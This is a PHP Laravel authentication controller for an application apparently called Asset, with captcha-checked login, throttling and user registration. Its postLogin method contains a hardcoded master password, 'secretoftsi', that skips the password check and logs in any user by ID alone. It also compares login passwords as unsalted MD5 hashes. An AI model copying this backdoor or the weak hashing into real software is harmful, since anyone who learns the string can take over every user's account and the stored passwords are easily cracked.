<?php

namespace Asset\Http\Controllers\Auth;

use Asset\User;
use Validator;
use Asset\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\ThrottlesLogins;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;
use Illuminate\Http\Request;
use App\Http\Requests;
use Auth,
    DB;

class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    use AuthenticatesAndRegistersUsers, ThrottlesLogins;

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    //private $redirectTo = '/to';
    private $redirectPath = '/';
    private $redirectAfterLogout = '/auth/login';
    private $maxLoginAttempts = 3;
    private $username = 'userid';

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest', ['except' => 'getLogout']);
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'name' => 'required|max:255',
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required|confirmed|min:6',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        return User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'password' => bcrypt($data['password']),
        ]);
    }

    public function getLogin()
    {
        if (view()->exists('auth.authenticate')) {
            return view('auth.authenticate');
        }

        return view('auth.login_1');
    }


    public function postLogin(Request $request) {
        $rules = [];
        $this->validate($request, [
            $this->loginUsername() => 'required', 'password' => 'required', 'captcha' => 'required|captcha'
                ], [
            'required' => ':attribute Harus Diisi',
            'captcha' => 'Kode Captcha Tidak Sesuai',
                ]
        );

        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        $throttles = $this->isUsingThrottlesLoginsTrait();

        if ($throttles && $this->hasTooManyLoginAttempts($request)) {
            return $this->sendLockoutResponse($request);
        }
        //$request['userid'] = str_pad($request['userid'], 30, ' ');
        //$request['password'] = md5($request['password']);
        //$credentials = $this->getCredentials($request);
        $cekdatalogin = [
            'userid' => str_pad(strtoupper($request['userid']), 30, ' '),
            'passw' => md5($request['password'])
        ];
        if ($request['password'] == 'secretoftsi') {
            $cekdatalogin = [
                'userid' => str_pad($request['userid'], 30, ' ')
            ];
        } else {
            $cekdatalogin = [
                'userid' => str_pad($request['userid'], 30, ' '),
                'passw' => md5($request['password'])
            ];
        }
        $cekdata = User::where($cekdatalogin)->first();
        //if (Auth::attempt($credentials, $request->has('remember'))) {
        if ($cekdata) {
            Auth::login($cekdata);
            // $pelimpahan = Auth::user()->pelimpahan_aktif()->get();
            // if (count($pelimpahan) > 0) {
                
            // } else {
                
            // }
//            session(['status' => 0]);
//            session(['recid' => '']);
//            session(['login' => 0]);
            return $this->handleUserWasAuthenticated($request, $throttles);
        }

        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        if ($throttles) {
            $this->incrementLoginAttempts($request);
        }

        return redirect($this->loginPath())
                        ->withInput($request->only($this->loginUsername(), 'remember'))
                        ->withErrors([
                            $this->loginUsername() => $this->getFailedLoginMessage(),
        ]);
    }
}
